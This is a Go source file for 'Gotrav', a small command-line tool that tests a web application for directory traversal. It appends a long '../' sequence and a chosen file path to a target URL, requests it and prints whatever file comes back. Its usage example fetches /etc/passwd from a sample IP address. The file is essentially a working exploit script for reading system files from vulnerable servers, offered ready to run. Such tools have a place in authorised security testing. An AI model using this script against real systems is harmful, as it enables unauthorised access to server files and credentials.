package main

import (
	"flag"
	"fmt"
	. "github.com/logrusorgru/aurora"
	"io/ioutil"
	"net/http"
	"os"
)

func banner() {
	//Just a cool banner :)
	fmt.Println(Cyan("                          .-') _   _  .-')     ('-.          (`-.   "))
	fmt.Println(Cyan(`                         (  OO) ) ( \\( -O )   ( OO ).-.    _(OO  )_ `))
	fmt.Println(BrightBlue(`  ,----.     .-'),-----. /     '._ ,------.   / . --. /,--(_/   ,. \\`))
	fmt.Println(BrightBlue(` '  .-./-') ( OO'  .-.  '|'--...__)|   /'. '  | \\-.  \\ \\   \\   /(__/`))
	fmt.Println(Blue(` |  |_( O- )/   |  | |  |'--.  .--'|  /  | |.-'-'  |  | \\   \\ /   / `))
	fmt.Println(Blue(` |  | .--, \\\\_) |  |\\|  |   |  |   |  |_.' | \\| |_.'  |  \\   '   /, `))
	fmt.Println(Magenta(`(|  | '. (_/  \\ | | |  |  |   |   |  .  '.'  |  .-.  |   \\     /__)`))
	fmt.Println(Magenta(` |  '--'  |    ''  '-'  '  |   |   |  |\  \   |  | |  |    \   /    `))
	fmt.Println(BrightMagenta(`  '------'       '-----'    '--'   '--' '--'  '--' '--'     '-'     `))
	fmt.Println(BrightRed("=========================================================================="))
	fmt.Println(Bold("                             Author: Usman Q Khan"))
}

func payloadTest(url string, path string) {

	//function to test different directory traversal payloads

	//different payloads to test
	payload1 := "../../../../../../../../../../../.."
	test := url + payload1 + path
	//request
	fmt.Println(Green("[*] Generating payload... [*]\n"))
	fmt.Println(test)
	//GET request to vulnerable web app
	req, err := http.Get(test)
	if err != nil {
		panic(err)
	}
	//Do this in case of error
	defer req.Body.Close()

	if req.Status != "200 OK" {
		fmt.Println(Red("\n[*] This website is not vulnerable to a directory traversal attack [*]\n"))
	} else {

		fmt.Println(Green("\n[*] Directory traversal successful [*]\n"))
		fmt.Println(BrightBlue("[*] Retrieving content... [*]\n"))
		//scan webpage to retrieve content
		scanner, err := ioutil.ReadAll(req.Body)
		//format web content as a string
		fmt.Printf("%s\n\n", scanner)
		if err != nil {
			panic(err)
		}
	}


}

func main() {
	//args
	url := flag.String("u", "", "Enter a URL")
	path := flag.String("p", "", "Enter the full path of the file you would like to find")
	outfile := flag.String("o", "", "Enter name of outfile")

	//custom flag usage prompt
	flag.Usage = func() {
		flagSet := flag.CommandLine
		banner()
		fmt.Println(Cyan("\nGotrav is a tool written in Go that can help determine whether a web application is vulnerable to a directory traversal attack"))
		fmt.Println(BrightBlue("\nUsage: ./gotrav -u <url> -p <path> -o <outfile>\n"))
		fmt.Println(Magenta("Example: ./gotrav -u http://10.10.10.10/ -p /etc/passwd -o users.txt\n"))
		fmt.Printf("Flags:\n")
		//order flags based on importance instead of alphabetical
		order := []string{"u", "p", "o"}
		for _, name := range order {
			flag := flagSet.Lookup(name)
			fmt.Printf("-%s\n", flag.Name)
			fmt.Printf("  %s\n", flag.Usage)
		}
	}
	if len(os.Args) < 2 {
		//exit program if there are no arguments
		banner()
		fmt.Println("\nEnter [-h] flag to view help menu\n")
		os.Exit(1)
	}
	//parse flags
	flag.Parse()

	fmt.Println("\nURL:", *url)
	fmt.Println("Path:", *path)
	fmt.Println("Outfile:", *outfile, "\n")

	payloadTest(*url, *path)
}
